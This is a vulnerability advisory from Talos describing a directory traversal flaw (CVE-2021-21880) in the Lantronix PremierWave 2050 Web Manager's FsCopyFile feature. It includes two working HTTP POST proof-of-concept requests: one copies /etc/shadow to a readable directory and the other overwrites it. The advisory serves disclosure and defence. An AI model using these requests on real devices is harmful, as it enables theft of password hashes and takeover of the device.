# Talos Vulnerability Report

### TALOS-2021-1324

## Lantronix PremierWave 2050 Web Manager FsCopyFile directory traversal vulnerability

##### November 15, 2021

##### CVE Number

CVE-2021-21880

### Summary

A directory traversal vulnerability exists in the Web Manager FsCopyFile functionality of Lantronix PremierWave 2050 8.9.0.0R4. A specially-crafted HTTP request can lead to local file inclusion. An attacker can make an authenticated HTTP request to trigger this vulnerability.

### Tested Versions

Lantronix PremierWave 2050 8.9.0.0R4 (in QEMU)

### Product URLs

<https://www.lantronix.com/products/premierwave2050/>

### CVSSv3 Score

7.2 - CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

### CWE

CWE-22 - Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)

### Details

PremierWave 2050 is an embedded Wi-Fi Module manufactured by Lantronix.

The PremierWave 2050 Web Manager allows an authenticated and properly authorized user to copy files around within a subdirectory of the device’s file system, rooted at `/ltrx_user/`. The system attempts to limit the user from interacting with files located outside of the `/ltrx_user/` directory by sanitizing some, but not all, of the attacker-controlled HTTP Post parameters. This feature is only accessible to users with the `filesystem` privilege.

A combination of attacker-controlled HTTP parameters (`cwd` and `dst`) can be altered to include path traversal primitives, which will not be sanitized before composition of the final file paths. This allows the attacker to copy arbitrary files into arbitrary locations, including the `/ltrx_user/` directory, where they can be read by any authenticated user, regardless of permission.

The below request will copy `/etc/shadow` into `/ltrx_user/shadow`.

```
POST / HTTP/1.1
Host: [IP]:[PORT]
Content-Length: 79
Authorization: Basic YnJvd25pZTpwb2ludHM=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

ajax=FsCopyFile&src=shadow&dst=../ltrx_user/shadow&submit=Copy&cwd=/../etc/

```

Conversely, it is also possible to upload a file into `/ltrx_user/` and use this vulnerability to copy the file into an arbitrary destination within the file system.

The below request will overwrite `/etc/shadow` with `/ltrx_user/shadow`.

```
POST / HTTP/1.1
Host: [IP]:[PORT]
Content-Length: 79
Authorization: Basic YnJvd25pZTpwb2ludHM=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

ajax=FsCopyFile&src=../ltrx_user/shadow&dst=shadow&submit=Copy&cwd=/../etc/

```
